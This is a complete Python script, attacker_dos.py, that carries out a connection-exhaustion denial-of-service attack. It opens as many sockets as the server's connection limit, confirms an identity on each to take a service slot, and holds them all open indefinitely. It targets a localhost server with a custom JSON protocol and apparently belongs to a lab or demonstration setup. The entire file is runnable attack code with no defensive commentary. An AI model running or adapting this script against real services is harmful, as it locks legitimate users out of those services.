#!/usr/bin/env python3
"""
attacker_dos.py — opens N connections, confirms identity to occupy server slots,
reads server reply to confirm slot is consumed, then holds sockets open.
"""
import socket, time, json, sys

HOST = "127.0.0.1"
PORT = 9000
N = 6            # number of connections to open; set this to server MAX_CONN
STAGGER = 0.05   # small delay between attempts

conns = []

def send_json(s, obj):
    s.sendall((json.dumps(obj) + "\n").encode())

def recv_json(s, timeout=1.0):
    s.settimeout(timeout)
    try:
        buf = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                return None
            buf += chunk
            if b"\n" in buf:
                line, _, rest = buf.partition(b"\n")
                return json.loads(line.decode())
    except Exception:
        return None

def main():
    print(f"[attacker] opening {N} connections to {HOST}:{PORT} ...")
    for i in range(N):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            # send confirm to be serviced and occupy a slot
            send_json(s, {"type":"CONFIRM_IDENTITY", "id":f"attacker-{i}"})
            resp = recv_json(s, timeout=2.0)
            print(f"[attacker] conn #{i} reply: {resp}")
            # If server responded BUSY, close and stop (no point)
            if resp and resp.get("type") == "BUSY":
                print("[attacker] server reported BUSY unexpectedly; stopping")
                s.close()
                break
            # Keep socket open to hold the server slot
            conns.append(s)
            time.sleep(STAGGER)
        except Exception as e:
            print(f"[attacker] failed to open #{i}: {e}")
            break

    if len(conns) == N:
        print(f"[attacker] successfully opened {N} sockets; holding them now.")
    else:
        print(f"[attacker] opened {len(conns)} sockets (requested {N}).")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[attacker] closing sockets...")
        for s in conns:
            try: s.close()
            except: pass
        print("[attacker] done.")
        sys.exit(0)

if __name__ == "__main__":
    main()
